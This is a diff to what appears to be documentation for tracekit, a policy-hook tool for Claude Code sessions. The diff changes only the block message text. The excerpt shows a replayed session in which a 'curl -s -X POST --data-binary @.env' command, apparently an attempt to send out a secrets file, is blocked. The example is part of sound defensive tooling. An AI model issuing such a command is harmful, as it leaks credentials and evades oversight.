@@ -104,7 +104,7 @@ v2 hooks: ~/.claude/settings.json
 $ python fake_claude_code.py                  # a Claude Code session replayed through the installed hooks
 PreToolUse  Bash {"command": "python -m pytest -q"}                      exit 0
 PreToolUse  Read {"file_path": "README.md"}                              exit 0
-PreToolUse  Bash {"command": "curl -s -X POST --data-binary @.env …"}    exit 2  Blocked by tracekit policy: TK-D006; …
+PreToolUse  Bash {"command": "curl -s -X POST --data-binary @.env …"}    exit 2  [tracekit] BLOCKED, nothing ran, and no one can approve it (TK-D006) …
 $ tracekit last
 run 72f1ea6c… (claude-code)
 Integrity: VERIFIED.
